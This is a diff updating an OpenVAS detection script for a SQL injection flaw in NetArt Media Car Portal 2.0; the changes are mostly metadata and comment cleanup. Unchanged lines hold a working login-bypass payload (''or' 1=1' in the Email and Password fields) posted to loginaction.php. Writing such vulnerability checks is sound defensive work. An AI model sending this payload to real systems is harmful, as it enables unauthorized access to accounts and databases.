@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_nam_carportal_sql_inj_vuln.nasl 7276 2017-09-26 11:59:52Z cfischer $
+# $Id: secpod_nam_carportal_sql_inj_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
 #
 # NetArt Media Car Portal SQL injection Vulnerability
 #
@@ -27,8 +27,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902475");
-  script_version("$Revision: 7276 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-09-26 13:59:52 +0200 (Tue, 26 Sep 2017) $");
+  script_version("$Revision: 11997 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
   script_tag(name:"creation_date", value:"2011-09-23 16:39:49 +0200 (Fri, 23 Sep 2011)");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
@@ -46,16 +46,13 @@ if(description)
   script_tag(name:"insight", value:"The flaw exists due to the error in 'loginaction.php', which
   fails to sufficiently sanitize user-supplied data in 'Email' and 'Password'
   parameters.");
-  script_tag(name:"solution", value:"No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
   script_tag(name:"summary", value:"This host is running NetArt Media Car Portal and is prone SQL
   injection vulnerability.");
   script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to bypass the
-  security restrictions or view, add, modify back-end database.
-
-  Impact Level: Application");
+  security restrictions or view, add, modify back-end database.");
   script_tag(name:"affected", value:"NetArt Media Car Portal Version 2.0");
 
   script_tag(name:"solution_type", value:"WillNotFix");
@@ -70,26 +67,21 @@ include("http_keepalive.inc");
 
 port = get_http_port( default:80 );
 
-## Check host supports PHP
 if( ! can_host_php( port:port ) ) exit( 0 );
 
 host = http_host_name( port:port );
 
-## Iterate over the possible paths
 foreach dir( make_list_unique( "/autoportal1", "/carportal", "/", cgi_dirs( port:port ) ) ) {
 
   if( dir == "/" ) dir = "";
 
-  ## Send and receive the data
   rcvRes = http_get_cache( item:dir + "/index.php", port:port );
 
-  ## Confirm the application
   if( '">Car Portal<' >< rcvRes && 'netartmedia' >< rcvRes ) {
 
     filename = dir + "/loginaction.php";
     authVariables ="Email=%27or%27+1%3D1&Password=%27or%27+1%3D1";
 
-    ## Construct post request
     sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                     "Host: ", host, "\r\n",
                     "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
@@ -98,7 +90,6 @@ foreach dir( make_list_unique( "/autoportal1", "/carportal", "/", cgi_dirs( port
                     authVariables);
     rcvRes = http_keepalive_send_recv( port:port, data:sndReq );
 
-    ## Check the Response and confirm the exploit
     if( "Location: DEALERS/index.php" >< rcvRes ) {
       report = report_vuln_url( port:port, url:filename );
       security_message( port:port, data:report );
